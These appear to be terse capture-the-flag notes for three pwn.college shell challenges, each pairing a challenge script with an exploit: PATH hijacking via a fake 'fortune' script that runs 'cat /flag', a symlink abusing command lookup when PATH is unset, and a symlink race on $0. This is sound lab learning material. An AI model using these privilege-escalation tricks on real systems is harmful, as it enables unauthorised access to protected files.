# The Transient Path

### chall

```sh
#!/opt/pwn.college/sh

fortune
```

### exploit
```
create shell script named 'fortune' in /home/hacker with content "cat /flag"
```

# Ferocious Functionality

### chall

```sh
#!/opt/pwn.college/bash

unset PATH
did you think you could hack this? It doesnt even exist!
```

### exploit
```sh
ln -s fortune did
```

last location where bash looks at for binary is current working directory

# The Surprising Swap

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

[ "$1" == "ping" ] && echo "pinged!" && read && "$0" pong
[ "$1" == "pong" ] && echo "ponged!"
```

### exploit
run /challenge/run via symlink
while /challenge/run is waiting for newline, swap symlink with 'cat /flag'